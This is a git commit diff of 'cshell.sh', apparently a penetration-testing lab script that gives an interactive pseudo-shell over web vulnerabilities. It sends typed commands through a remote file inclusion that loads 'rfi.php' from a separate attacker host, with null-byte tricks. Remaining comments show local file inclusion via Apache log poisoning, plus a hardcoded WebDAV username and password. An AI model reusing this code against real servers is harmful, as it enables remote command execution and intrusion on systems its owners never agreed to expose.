049bd610ef8a491327eb618ee54fd946271a8b4d
root <root@localhost.localdomain>
2018-03-12 22:33:52 +0000

    housekeeping

--- cshell.sh
+++ cshell.sh
@@ -2,14 +2,18 @@
 #http://10.10.10.67/webdav_test_inception/s.php
 
 if [ $1='' ]; then
-	url='http://10.11.11.130/addguestbook.php?name=test&comment=thank+you'
+	url='http://10.11.1.8/internal/advanced_comment_system/index.php?ACS_path=http://10.11.0.245/rfi.php%00'
 else 
 	url=$1
 fi
 
+echo [*] Using: $url
+
 while true; do
 read -p "spotshell#: " cmd
-curl --data-urlencode "cmd=$cmd&LANG=../../../../../xampp/apache/logs/access.log%00" $url -G -v 2>&1
+ncmd=`echo $cmd | sed 's/ /\+/'`
+curl "http://10.11.1.8/internal/advanced_comment_system/index.php?cmd=$ncmd&ACS_path=http://10.11.0.245/rfi.php" --data-urlencode -G 2>&1
+# curl --data-urlencode "cmd=$cmd" $url -G 2>&1
 #curl --basic --user 'webdav_tester:babygurl69' --data-urlencode "cmd=$cmd" $1 -G
 # http://10.10.10.57:62696/Test.asp?u=http://localhost/cmd.aspx?xcmd=ping%2010.10.17.88
 # http://10.11.11.130/addguestbook.php?name=test&comment=thank+you&LANG=../../../../../xampp/apache/logs/access.log%00&cmd=asas
